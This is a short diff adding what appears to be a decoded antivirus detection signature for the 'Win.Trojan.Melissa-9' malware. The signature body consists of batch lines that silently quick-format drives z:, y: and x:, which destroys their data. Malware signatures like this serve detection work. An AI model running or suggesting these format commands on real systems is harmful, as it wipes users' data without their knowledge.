@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Melissa-9
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+o off
+echo y|format/q z: /v:Empty >NUL
+echo y|format/q y: /v:Empty >NUL
+echo y|format/q x: /v:Empty >NUL
